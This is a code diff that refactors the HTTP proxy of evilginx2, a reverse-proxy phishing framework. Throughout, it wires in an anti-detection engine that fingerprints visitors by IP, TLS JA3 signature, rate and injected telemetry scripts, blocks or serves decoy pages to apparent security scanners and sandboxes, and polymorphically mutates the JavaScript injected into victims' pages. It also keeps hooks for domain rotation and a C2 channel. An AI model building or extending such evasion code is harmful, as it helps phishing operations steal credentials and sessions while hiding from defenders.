@@ -41,6 +41,10 @@ import (
 	"github.com/inconshreveable/go-vhost"
 	http_dialer "github.com/mwitkow/go-http-dialer"
 
+	"github.com/kgretzky/evilginx2/core/antibot"
+	"github.com/kgretzky/evilginx2/core/antibot/infra"
+	"github.com/kgretzky/evilginx2/core/antibot/response"
+	"github.com/kgretzky/evilginx2/core/antibot/signals"
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
 )
@@ -74,16 +78,12 @@ type HttpProxy struct {
 	gophish  *GoPhish
 	telegram *TelegramBot
 
-	mlDetector        *MLBotDetector
-	ja3Fingerprinter  *JA3Fingerprinter
-	tlsInterceptor    *TLSInterceptor
-	captchaManager    *CaptchaManager
-	domainRotation    *DomainRotationManager
-	trafficShaper     *TrafficShaper
-	sandboxDetector   *SandboxDetector
+	antibotEngine     *antibot.AntibotEngine
+	captchaManager    *response.CaptchaManager
+	spoofManager      *response.SpoofManager
+	domainRotation    *infra.DomainRotationManager
 	c2Channel         *C2Channel
-	polymorphicEngine *PolymorphicEngine
-	obfuscator        *JSObfuscator
+	polymorphicEngine *infra.PolymorphicEngine
 	sessionFormatter  *SessionFormatter
 	sniListener       net.Listener
 	isRunning         bool
@@ -134,16 +134,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		gophish:  NewGoPhish(),
 		telegram: NewTelegramBot(),
 
-		mlDetector:        nil, // Will be initialized based on config
-		ja3Fingerprinter:  NewJA3Fingerprinter(),
-		tlsInterceptor:    nil, // Will be initialized with JA3 fingerprinter
-		captchaManager:    NewCaptchaManager(cfg.GetCaptchaConfig()),
+		antibotEngine:     nil, // Will be initialized
+		captchaManager:    response.NewCaptchaManager(cfg.GetCaptchaConfig()),
+		spoofManager:      response.NewSpoofManager(cfg.GetAntibotConfig().SpoofUrl, cfg.GetSandboxDetectionConfig().HoneypotResponse),
 		domainRotation:    nil, // Will be initialized based on config
-		trafficShaper:     nil, // Will be initialized based on config
-		sandboxDetector:   nil, // Will be initialized based on config
 		c2Channel:         nil, // Will be initialized based on config
 		polymorphicEngine: nil, // Will be initialized based on config
-		obfuscator:        NewJSObfuscator(cfg),
 		sessionFormatter:  NewSessionFormatter(),
 		isRunning:         false,
 		last_sid:          0,
@@ -191,34 +187,38 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	p.sessions = make(map[string]*Session)
 	p.sids = make(map[string]int)
 
-	// Initialize TLS interceptor
-	p.tlsInterceptor = NewTLSInterceptor(p.ja3Fingerprinter)
-	log.Info("JA3/JA3S TLS fingerprinting enabled with %d known bot signatures", p.ja3Fingerprinter.GetKnownBotCount())
+	// Initialize Signals & AntibotEngine
+	ipSignal, _ := signals.NewIPSignal(bl.GetPath(), wl.GetPath())
+	ipSignal.SetOptions(cfg.GetBlacklistMode(), cfg.whitelistConfig.Enabled, cfg.GetAntibotConfig().OverrideIPs)
 
-	// Initialize ML detector if enabled in config
-	if cfg.IsMLDetectorEnabled() {
-		mlConfig := cfg.GetMLDetectorConfig()
-		p.mlDetector = NewMLBotDetector(mlConfig.Threshold, p.tlsInterceptor)
-		log.Info("ML bot detector enabled with threshold: %.2f", mlConfig.Threshold)
-	}
-
-	// Initialize domain rotation if enabled
-	if cfg.GetDomainRotationConfig() != nil && cfg.GetDomainRotationConfig().Enabled {
-		p.domainRotation = NewDomainRotationManager(cfg.GetDomainRotationConfig(), p.crt_db)
-		log.Info("Domain rotation system initialized")
-	}
-
-	// Initialize traffic shaper if enabled
+	var rateSignal *signals.TrafficShaper
 	if cfg.GetTrafficShapingConfig() != nil && cfg.GetTrafficShapingConfig().Enabled {
-		p.trafficShaper = NewTrafficShaper(cfg.GetTrafficShapingConfig())
-		log.Info("Traffic shaping system initialized")
+		// Assuming we adapt traffic shaper config down the line
+		rateSignal = signals.NewTrafficShaper(cfg.GetTrafficShapingConfig())
+		log.Info("Traffic shaping system initialized via rate signal")
 	}
 
-	// Initialize sandbox detector if enabled
-	if cfg.GetSandboxDetectionConfig() != nil && cfg.GetSandboxDetectionConfig().Enabled {
-		p.sandboxDetector = NewSandboxDetector(cfg.GetSandboxDetectionConfig(), p.obfuscator)
-		log.Info("Sandbox detection system initialized")
+	tlsSignal := signals.NewTLSSignal()
+	log.Info("JA3/JA3S TLS fingerprinting enabled via TLS signal")
+
+	var telemetrySignal *signals.TelemetrySignal
+	mlEnabled := cfg.IsMLDetectorEnabled()
+	envEnabled := cfg.GetSandboxDetectionConfig() != nil && cfg.GetSandboxDetectionConfig().Enabled
+	
+	if mlEnabled || envEnabled {
+		mlThreshold := 0.8 // default
+		if mlEnabled {
+			mlThreshold = cfg.GetMLDetectorConfig().Threshold
+			log.Info("Behavior ML signal enabled with threshold: %.2f", mlThreshold)
+		}
+		if envEnabled {
+			log.Info("Sandbox / Environment signal enabled")
+		}
+		telemetrySignal = signals.NewTelemetrySignal(mlThreshold, tlsSignal.Interceptor, envEnabled)
 	}
+
+	p.antibotEngine = antibot.NewAntibotEngine(ipSignal, rateSignal, tlsSignal, telemetrySignal)
+
 
 	// Initialize C2 channel if enabled
 	if cfg.GetC2ChannelConfig() != nil && cfg.GetC2ChannelConfig().Enabled {
@@ -231,9 +231,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		}
 	}
 
+	// Initialize domain rotation if enabled
+	if cfg.GetDomainRotationConfig() != nil && cfg.GetDomainRotationConfig().Enabled {
+		p.domainRotation = infra.NewDomainRotationManager(cfg.GetDomainRotationConfig())
+		log.Info("Domain rotation system initialized")
+	}
+
 	// Initialize polymorphic engine if enabled
 	if cfg.GetPolymorphicConfig() != nil && cfg.GetPolymorphicConfig().Enabled {
-		p.polymorphicEngine = NewPolymorphicEngine(cfg.GetPolymorphicConfig())
+		p.polymorphicEngine = infra.NewPolymorphicEngine(cfg.GetPolymorphicConfig())
 		log.Info("Polymorphic JavaScript engine initialized with %s mutation level", cfg.GetPolymorphicConfig().MutationLevel)
 	}
 
@@ -260,37 +266,39 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			hiblue := color.New(color.FgHiBlue)
 
 			// -------------------------------------------------------------------------
-			// REFACTORED: Chain of Responsibility (Middleware)
+			// REFACTORED: Antibot Engine Evaluation
 			// -------------------------------------------------------------------------
-			middlewares := []ProxyMiddleware{
-				&IPMiddleware{},
-				&TrafficMiddleware{},
-				&BotMiddleware{},
-			}
+			from_ip := p.getRealIP(req)
+			ps.RemoteIP = from_ip
 
-			for _, m := range middlewares {
-				r, resp, proceed := m.Handle(req, ctx, p)
-				if resp != nil {
-					return r, resp
-				}
-				if !proceed {
-					// Fallback block if false returned without response
+			var tlsState *tls.ConnectionState
+			if ctx.Resp != nil && ctx.Resp.TLS != nil {
+				tlsState = ctx.Resp.TLS
+			}
+			clientID := p.getClientIdentifier(req)
+
+			if p.antibotEngine != nil {
+				verdict := p.antibotEngine.Evaluate(req, from_ip, tlsState, clientID)
+				if !verdict.Allow {
+					if verdict.Action == "spoof" && p.spoofManager != nil {
+						r, resp := p.spoofManager.ServeSpoofResponse(req)
+						return r, resp
+					}
+					// Default to block
 					r, resp := p.blockRequest(req)
 					return r, resp
 				}
 			}
 
 			// Core Logic continues...
-			// Update from_ip to be consistent with middleware extraction
-			from_ip := ctx.UserData.(*ProxySession).RemoteIP
 
 			// Handle API endpoints
 			if strings.HasPrefix(req.URL.Path, "/api/legacy/cloudflare/worker") {
 				return p.handleCloudflareWorkerAPI(req)
 			}
 
-			if strings.HasPrefix(req.URL.Path, "/api/event/client-detection") {
-				return p.handleSandboxDetection(req, from_ip)
+			if strings.HasPrefix(req.URL.Path, "/api/telemetry/") {
+				return p.handleTelemetryData(req, from_ip)
 			}
 
 			if strings.HasPrefix(req.URL.Path, "/api/captcha/verify") {
@@ -405,16 +413,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 							script, err := pl.GetScriptInjectById(js_id, js_params)
 							if err == nil {
-								// Apply obfuscation if enabled
-								if p.cfg.GetJSObfuscationConfig() != nil && p.cfg.GetJSObfuscationConfig().Enabled {
-									level := ObfuscationLevel(p.cfg.GetJSObfuscationConfig().Level)
-									obfuscatedScript, obfErr := p.obfuscator.ObfuscateScript(script, level)
-									if obfErr == nil {
-										d_body += obfuscatedScript + "\n\n"
-									} else {
-										log.Warning("js_inject: obfuscation failed: %v", obfErr)
-										d_body += script + "\n\n"
+								// Apply polymorphic mutations if enabled
+								if p.cfg.GetPolymorphicConfig() != nil && p.cfg.GetPolymorphicConfig().Enabled && p.polymorphicEngine != nil {
+									context := &infra.MutationContext{
+										SessionID: session_id,
+										Timestamp: time.Now().Unix(),
+										Seed:      time.Now().UnixNano(),
 									}
+									mutatedScript := p.polymorphicEngine.Mutate(script, context)
+									d_body += mutatedScript + "\n\n"
 								} else {
 									d_body += script + "\n\n"
 								}
@@ -445,16 +452,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									dynamic_redirect_js := DYNAMIC_REDIRECT_JS
 									dynamic_redirect_js = strings.ReplaceAll(dynamic_redirect_js, "{session_id}", s.Id)
 
-									// Apply obfuscation if enabled
-									if p.cfg.GetJSObfuscationConfig() != nil && p.cfg.GetJSObfuscationConfig().Enabled {
-										level := ObfuscationLevel(p.cfg.GetJSObfuscationConfig().Level)
-										obfuscatedScript, obfErr := p.obfuscator.ObfuscateScript(dynamic_redirect_js, level)
-										if obfErr == nil {
-											d_body += obfuscatedScript + "\n\n"
-										} else {
-											log.Warning("js: obfuscation failed: %v", obfErr)
-											d_body += dynamic_redirect_js + "\n\n"
+									// Apply polymorphic mutations if enabled
+									if p.cfg.GetPolymorphicConfig() != nil && p.cfg.GetPolymorphicConfig().Enabled && p.polymorphicEngine != nil {
+										context := &infra.MutationContext{
+											SessionID: session_id,
+											Timestamp: time.Now().Unix(),
+											Seed:      time.Now().UnixNano(),
 										}
+										mutatedScript := p.polymorphicEngine.Mutate(dynamic_redirect_js, context)
+										d_body += mutatedScript + "\n\n"
 									} else {
 										d_body += dynamic_redirect_js + "\n\n"
 									}
@@ -1440,56 +1446,22 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							log.Debug("js_inject: injected redirect script for session: %s", s.Id)
 							body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s.js", s.Id))
 
-							// Inject behavior collection JavaScript
-							if p.mlDetector != nil && p.mlDetector.featureExtractor != nil {
-								behaviorJS := p.mlDetector.featureExtractor.BehaviorCollectorJS(s.Id)
-
-								// Apply polymorphic mutations if enabled
-								if p.polymorphicEngine != nil && p.cfg.GetPolymorphicConfig().Enabled {
-									context := &MutationContext{
-										SessionID: s.Id,
-										Timestamp: time.Now().Unix(),
-									}
-
-									if p.cfg.GetPolymorphicConfig().TemplateMode {
-										// Use template mode
-										params := map[string]string{
-											"endpoint":    "/api/behavior/" + s.Id,
-											"delay":       "5000",
-											"getTime":     "Date.now",
-											"docListener": "document.addEventListener",
-										}
-										mutatedJS, err := p.polymorphicEngine.MutateTemplate("behavior_collector", context, params)
-										if err == nil {
-											behaviorJS = mutatedJS
-											log.Debug("js_inject: applied polymorphic template mutation for session: %s", s.Id)
-										}
-									} else {
-										// Direct mutation
-										behaviorJS = p.polymorphicEngine.Mutate(behaviorJS, context)
-										log.Debug("js_inject: applied polymorphic mutation for session: %s", s.Id)
-									}
-								}
-
-								body = p.injectJavascriptIntoBody(body, behaviorJS, "")
-								log.Debug("js_inject: injected behavior collector for session: %s", s.Id)
-							}
-
-							// Inject sandbox detection JavaScript
-							if p.sandboxDetector != nil && p.cfg.GetSandboxDetectionConfig().ClientSideChecks {
-								sandboxJS := p.sandboxDetector.GetDetectionScript()
-								if sandboxJS != "" {
+							// Inject telemetry JavaScript (behavior collection and sandbox detection)
+							if p.antibotEngine != nil && p.antibotEngine.Telemetry != nil {
+								telemetryJS := p.antibotEngine.Telemetry.TelemetryJS(s.Id)
+								if telemetryJS != "" {
 									// Apply polymorphic mutations if enabled
 									if p.polymorphicEngine != nil && p.cfg.GetPolymorphicConfig().Enabled {
-										context := &MutationContext{
+										context := &infra.MutationContext{
 											SessionID: s.Id,
 											Timestamp: time.Now().Unix(),
 										}
-										sandboxJS = p.polymorphicEngine.Mutate(sandboxJS, context)
-										log.Debug("js_inject: applied polymorphic mutation to sandbox detector for session: %s", s.Id)
+										
+										telemetryJS = p.polymorphicEngine.Mutate(telemetryJS, context)
+										log.Debug("js_inject: applied polymorphic mutation to telemetry script for session: %s", s.Id)
 									}
-									body = p.injectJavascriptIntoBody(body, sandboxJS, "")
-									log.Debug("js_inject: injected sandbox detector for session: %s", s.Id)
+									body = p.injectJavascriptIntoBody(body, telemetryJS, "")
+									log.Debug("js_inject: injected telemetry script for session: %s", s.Id)
 								}
 							}
 
@@ -2072,8 +2044,8 @@ func (p *HttpProxy) httpsWorker() {
 			c.SetWriteDeadline(now.Add(httpWriteTimeout))
 
 			// Wrap connection with TLS interceptor
-			if p.tlsInterceptor != nil {
-				c = p.tlsInterceptor.WrapConn(c)
+			if p.antibotEngine != nil && p.antibotEngine.TLS != nil && p.antibotEngine.TLS.Interceptor != nil {
+				c = p.antibotEngine.TLS.Interceptor.WrapConn(c)
 			}
 
 			tlsConn, err := vhost.TLS(c)
@@ -2331,8 +2303,8 @@ func (p *HttpProxy) Start() error {
 	}
 
 	// Start traffic shaper if enabled
-	if p.trafficShaper != nil && p.cfg.GetTrafficShapingConfig().Enabled {
-		err := p.trafficShaper.Start()
+	if p.antibotEngine != nil && p.antibotEngine.Rate != nil && p.cfg.GetTrafficShapingConfig().Enabled {
+		err := p.antibotEngine.Rate.Start()
 		if err != nil {
 			log.Error("Failed to start traffic shaper: %v", err)
 		}
@@ -2594,7 +2566,7 @@ func (p *HttpProxy) handleCloudflareWorkerAPI(req *http.Request) (*http.Request,
 	return req, resp
 }
 
-func (p *HttpProxy) handleBehaviorData(req *http.Request) (*http.Request, *http.Response) {
+func (p *HttpProxy) handleTelemetryData(req *http.Request, from_ip string) (*http.Request, *http.Response) {
 	// Extract session ID from path
 	pathParts := strings.Split(req.URL.Path, "/")
 	if len(pathParts) < 4 {
@@ -2615,94 +2587,19 @@ func (p *HttpProxy) handleBehaviorData(req *http.Request) (*http.Request, *http.
 	}
 	defer req.Body.Close()
 
-	// Parse behavior data
-	var behaviorData map[string]interface{}
-	if err := json.Unmarshal(body, &behaviorData); err != nil {
-		return req, goproxy.NewResponse(req, "application/json", http.StatusBadRequest, `{"error":"Invalid JSON"}`)
-	}
-
 	// Get client identifier
 	clientID := p.getClientIdentifier(req)
 
-	// Update ML detector's feature extractor with behavior data
-	if p.mlDetector != nil && p.mlDetector.featureExtractor != nil {
-		err := p.mlDetector.featureExtractor.UpdateClientBehavior(clientID, behaviorData)
+	// Process telemetry data
+	if p.antibotEngine != nil && p.antibotEngine.Telemetry != nil {
+		err := p.antibotEngine.Telemetry.ProcessTelemetry(body, clientID, from_ip)
 		if err != nil {
-			log.Debug("[ML Detector] Failed to update behavior: %v", err)
+			log.Debug("[Telemetry] Failed to process data for session %s: %v", sessionID, err)
+			return req, goproxy.NewResponse(req, "application/json", http.StatusBadRequest, `{"error":"Invalid telemetry data"}`)
 		}
 	}
 
-	// Log behavior data counts safely
-	mouseCount := 0
-	keyboardCount := 0
-	if mouseData, ok := behaviorData["mouse"].([]interface{}); ok {
-		mouseCount = len(mouseData)
-	}
-	if keyboardData, ok := behaviorData["keyboard"].([]interface{}); ok {
-		keyboardCount = len(keyboardData)
-	}
-
-	log.Debug("[Behavior] Received data from session %s: %d mouse, %d keyboard events",
-		sessionID, mouseCount, keyboardCount)
-
-	// Return success response
-	return req, goproxy.NewResponse(req, "application/json", http.StatusOK, `{"status":"ok"}`)
-}
-
-func (p *HttpProxy) serveSpoofResponse(req *http.Request) (*http.Request, *http.Response) {
-	antibotConfig := p.cfg.GetAntibotConfig()
-	if antibotConfig == nil || antibotConfig.SpoofUrl == "" {
-		return req, goproxy.NewResponse(req, "text/plain", http.StatusNotFound, "Not Found")
-	}
-
-	// Fetch spoof content
-	resp, err := http.Get(antibotConfig.SpoofUrl)
-	if err != nil {
-		log.Error("Failed to fetch spoof content: %v", err)
-		return req, goproxy.NewResponse(req, "text/plain", http.StatusNotFound, "Not Found")
-	}
-	defer resp.Body.Close()
-
-	body, err := ioutil.ReadAll(resp.Body)
-	if err != nil {
-		log.Error("Failed to read spoof content: %v", err)
-		return req, goproxy.NewResponse(req, "text/plain", http.StatusNotFound, "Not Found")
-	}
-
-	// Create response with spoofed content
-	contentType := resp.Header.Get("Content-Type")
-	if contentType == "" {
-		contentType = "text/html"
-	}
-
-	return req, goproxy.NewResponse(req, contentType, http.StatusOK, string(body))
-}
-
-func (p *HttpProxy) handleSandboxDetection(req *http.Request, from_ip string) (*http.Request, *http.Response) {
-	// Only accept POST requests
-	if req.Method != "POST" {
-		return req, goproxy.NewResponse(req, "application/json", http.StatusMethodNotAllowed, `{"error":"Method not allowed"}`)
-	}
-
-	// Read request body
-	body, err := ioutil.ReadAll(req.Body)
-	if err != nil {
-		return req, goproxy.NewResponse(req, "application/json", http.StatusBadRequest, `{"error":"Failed to read request body"}`)
-	}
-	defer req.Body.Close()
-
-	// Use passed IP
-
-	// Process detection data
-	if p.sandboxDetector != nil {
-		err := p.sandboxDetector.ProcessClientDetection(body, from_ip)
-		if err != nil {
-			log.Debug("[Sandbox Detector] Failed to process client detection: %v", err)
-			return req, goproxy.NewResponse(req, "application/json", http.StatusBadRequest, `{"error":"Invalid detection data"}`)
-		}
-	}
-
-	log.Debug("[Sandbox Detector] Received client-side detection from %s", from_ip)
+	log.Debug("[Telemetry] Received data from session %s", sessionID)
 
 	// Return success response
 	return req, goproxy.NewResponse(req, "application/json", http.StatusOK, `{"status":"ok"}`)
